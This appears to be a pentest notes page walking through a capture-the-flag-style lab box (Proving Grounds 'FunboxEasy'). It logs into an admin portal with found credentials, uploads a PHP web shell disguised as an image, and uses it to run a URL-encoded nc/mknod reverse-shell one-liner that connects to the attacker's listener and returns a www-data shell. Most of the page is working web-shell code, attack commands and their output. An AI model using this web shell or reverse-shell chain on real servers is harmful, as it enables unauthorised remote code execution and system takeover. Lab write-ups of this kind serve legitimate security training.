---
layout: default
title: PHP Web Shell
parent: Shells
nav_order: 1
---

# PHP Web Shell

---

## Generic PHP Web Shell File Upload to LFI Reverse Shell

Authenticate to _admin.php_ portal with discovered credentials.

![auth](../../../../assets/images/ctfs/proving_grounds/funboxeasy/auth.png)

Edit a book...

![edit](../../../../assets/images/ctfs/proving_grounds/funboxeasy/edit.png)

Upload a PHP command shell file using the Image file option.

![upload](../../../../assets/images/ctfs/proving_grounds/funboxeasy/upload.png)

```bash
# Create file test.php with the following web shell code

<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
?>

```

Images are placed in the _/img_ directory.
Test PHP shell RCE functionality.

![cmd](../../../../assets/images/ctfs/proving_grounds/funboxeasy/cmd.png)

Now that we have a PHP command shell uploaded let get a revere shell.

Use _revshellgen_ and _urlencode_ to get a url encoded mk-nod reverse shell one-liner.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod | tail -n 1
rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Run the reverse shell one-liner and get a reverse shell on our netcat listener.

```bash
URL: 192.168.222.111/store/bootstrap/img/test.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.222.111] 39914
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
